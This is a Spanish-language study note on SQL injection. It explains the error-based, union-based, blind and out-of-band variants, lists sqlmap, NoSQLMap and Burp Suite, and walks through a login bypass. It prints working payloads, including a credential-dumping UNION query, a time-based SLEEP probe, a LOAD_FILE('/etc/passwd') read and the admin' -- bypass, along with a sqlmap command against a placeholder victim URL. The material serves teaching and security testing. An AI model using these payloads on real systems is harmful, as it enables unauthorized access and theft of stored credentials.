---

---
-----
- Tags: #SQL
--------
## ¿En qué consiste?

> **SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

Las aplicaciones web que no validan correctamente las entradas del usuario pueden ser vulnerables a SQLi. Un atacante puede inyectar código SQL malicioso en campos de entrada como formularios, URL o encabezados HTTP para alterar la consulta esperada.

## Tipos de inyección SQL

##### **1. SQLi basado en errores**

Se aprovecha de mensajes de error detallados de la base de datos para extraer información. Un ejemplo de payload es el siguiente:
```sql
' OR 1=1 -- -
```

Si la aplicación muestra un mensaje de error SQL, podría revelar estructura de tablas o consultas utilizadas.

##### **2. SQLi basado en unión (union-based)**

Permite recuperar datos combinando la consulta original con otra mediante `UNION`. Un ejemplo de payload es el siguiente:

``` sql
' UNION SELECT username, password FROM users --
```

Si la cantidad de columnas es incorrecta, se pueden usar pruebas como

```sql
' ORDER BY 1 -- 
' ORDER BY 2 --
```

##### **3. SQLi ciego (Blind SQLi)**

Ocurre cuando la aplicación no devuelve errores visibles, pero aún se pueden inferir respuestas basadas en el comportamiento.

- **Boolean-Based:**

```sql
' AND 1=1 -- (devuelve resultados) 
' AND 1=0 -- (no devuelve resultados)
```

- **Time-Based:** 

```sql
' OR IF(1=1, SLEEP(5), 0) --
```

Si la respuesta tarda en volver, significa que el ataque funcionó.

##### **4. SQLi Fuera de Banda (OOB SQLi)**

Usa canales externos como DNS o HTTP para extraer datos. Ejemplo: 

```sql
' UNION SELECT LOAD_FILE('/etc/passwd') --
```

## Herramientas

##### 🛠 **1. Sqlmap**

Automatiza la detección y explotación de SQLi. Ejemplo de escaneo básico:

```bash
sqlmap -u "http://victima.com/login.php?id=1" --dbs
```

🔗 [Sqlmap en GitHub](https://github.com/sqlmapproject/sqlmap)

##### 🛠 **2. NoSQLMap**

Para inyecciones en bases de datos NoSQL (MongoDB, CouchDB, etc.).  
🔗 [NoSQLMap en GitHub](https://github.com/codingo/NoSQLMap)

##### 🛠 **3. Burp Suite**

Permite manipular peticiones para probar SQLi manualmente. Puedes ver más en [[Burpsuite]]
🔗 Burp Suite

## Ejemplos Prácticos

### 🔹 **Bypass de login con SQLi**

Si una aplicación usa la siguiente consulta SQL en un formulario de login:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass';
```

Se puede inyectar lo siguiente:

```sql
admin' --
```

Lo que genera:

```sql
SELECT * FROM users WHERE username='admin' --' AND password='';
```

De esta manera podemos acceder sin conocer la contraseña